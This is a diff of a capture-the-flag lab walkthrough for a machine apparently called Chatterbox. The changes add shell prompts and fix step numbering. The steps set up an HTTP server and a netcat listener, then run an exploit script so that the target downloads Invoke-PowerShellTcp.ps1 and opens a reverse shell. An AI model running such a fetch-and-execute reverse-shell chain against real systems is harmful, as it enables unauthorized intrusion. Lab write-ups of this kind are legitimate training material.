@@ -144,21 +144,21 @@ Once you have updated this script, we will need 3 seperate terminals: python HTT
 1. Start the HTTP python server:
 
 ```bash
-python3 -m http.server 80
+t3lesph0re@neptune:~$ python3 -m http.server 80
 ```
 
-1. Start the listener:
+2. Start the listener:
 
 ```bash
-nc -lnvp 8082
+t3lesph0re@neptune:~$ nc -lnvp 8082
 ```
 
-1. Run the Python script:
+3. Run the Python script:
 
 Because the script shebang shows **#!/usr/bin/python**, we will use **Python2**:
 
 ```bash
-python2 36025
+t3lesph0re@neptune:~$ python2 36025
 ```
 
 The Python script will run and you will see that the **Invoke-PowerShellTcp.ps1** was grab from the Python HTTP server `10.10.10.74 - - [14/Oct/2025 19:09:22] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -`. Additionally, the script will output its `---->{P00F}!` and you will get your reverse shell for the user **chatterbox\alfred**. 
